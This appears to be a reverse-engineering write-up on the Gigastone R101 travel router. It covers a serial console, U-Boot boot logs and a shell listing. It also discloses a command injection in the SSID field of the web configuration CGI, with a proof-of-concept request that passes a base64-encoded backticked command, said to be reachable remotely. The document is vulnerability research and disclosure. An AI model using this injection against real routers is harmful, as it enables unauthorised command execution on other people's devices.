# RE of Gigastone R101 Mini Wireless Router / Wireless Travel Router

The R101 is a cheap wireless router sold by Gigastone.
Gigastone is a electronics brand based in Taiwan.

[Amazon link1.](https://www.amazon.com/Gigastone-GS-TR1-R-Wireless-Travel-Router/dp/B01DR04V90)
[Amazon link2.](https://www.amazon.com/Gigastone-TR1-Wireless-Extension-Processor/dp/B0BVTYYDQH/)

![41-czovIRFL _AC_SX522_](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/36e0f064-4b5e-4bf8-bdb5-3b70db17efa8)

# Web interface

After logging in with the default credentials, I watched network traffic from dev tools while setting the SSID.
It seems the device uses `tr1.cgi?cgi=2` for configuration.
The device uses base64 to send the SSID.
This field has command injection, and we can use the new SSID as the commands output.

SSID is set to base64 of string `` `echo hi` `` (`YGVjaG8gaGlgCg==`)
```
http://<ROUTER_IP>/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YGVjaG8gaGlgCg==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=
```

This seems to be hittable from a remote IP.

# Hardware/Serial

We can find Gigastones filing for R101 in the [FCC ID](https://fccid.io/PLE-TRR1011) database

Looking at internal photos from FCCID, it looks like there's a serial port in the corner opposite the power button.

![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/433ee296-e97e-460f-9b0a-e1deccdd58d3)

Soldering to the board and watching for serial confirms this.
I used a "USB to TTL" adapter to get serial from USB.
Using a multimeter in continuity mode showed the leftmost pin was ground.

Watching boot with baud set to 115200
```
U-Boot 1.1.4-ga519b4f0-dirtyOct  9 201317:21:10

AP121 (ar9331) U-boot

DRAM:  16 MB
Flash Manuf Id 0x0, DeviceId0 0x0, DeviceId1 0x0
flash size 4194304, sector count = 64
Flash:  4 MB
Using default environment

In:    serial
Out:   serial
Err:   serial
Net:   ag7240_enet_initialize...
No valid address in Flash. Using fixed address
No valid address in Flash. Using fixed address
: cfg1 0x5 cfg2 0x7114
eth0: 00:03:7f:09:0b:ad
eth0 up
: cfg1 0xf cfg2 0x7214
eth1: 00:03:7f:09:0b:ad
athrs26_reg_init_lan
ATHRS26: resetting s26
ATHRS26: s26 reset done
eth1 up
eth0, eth1
Hit any key to stop autoboot:  0
## Booting image at 9f300000 ...
   Image Name:   Linux Kernel Image
   Created:      2014-02-26   4:14:51 UTC
   Image Type:   MIPS Linux Kernel Image (lzma compressed)
   Data Size:    905965 Bytes = 884.7 kB
   Load Address: 80002000
   Entry Point:  801ea0e0
   Verifying Checksum at 0x9f300040 ...OK
   Uncompressing Kernel Image ... OK

Starting kernel ▒ɩ
                  ▒▒▒▒▒Zk▒*▒3▒  ▒▒▒YW▒▒
```

Watching boot with baud set to 128000
```
`@@▒▒▒▒▒▒▒▒▒`▒▒▒▒▒▒▒▒`▒▒`p▒y▒s`ppdp@^nN▒▒
`@@▒▒▒▒▒▒▒▒▒▒▒▒▒`▒▒▒▒▒▒@▒▒▒▒▒@^nN@▒▒
▒▒▒▒▒▒▒▒@▒▒▒▒▒▒ ...

Booting AR9330(Hornet)...
```

Hitting a key during boot brings us to a UBOOT shell
```
TR1> help
reset   - Perform RESET of the CPU
?       - alias for 'help'
boot    - boot default, i.e., run 'bootcmd'
bootd   - boot default, i.e., run 'bootcmd'
bootm   - boot application image from memory
cp      - memory copy
dhcp    - invoke DHCP client to obtain IP/boot params
erase   - erase FLASH memory
help    - print online help
httpd   - start webserver
md      - memory display
mm      - memory modify (auto-incrementing)
mtest   - simple RAM test
mw      - memory write (fill)
nm      - memory modify (constant address)
ping    - send ICMP ECHO_REQUEST to network host
printenv- print environment variables
progmac - Set ethernet MAC addresses
reset   - Perform RESET of the CPU
run     - run commands in an environment variable
setenv  - set environment variables
tftpboot- boot image via network using TFTP protocol
version - print monitor version
TR1>
```
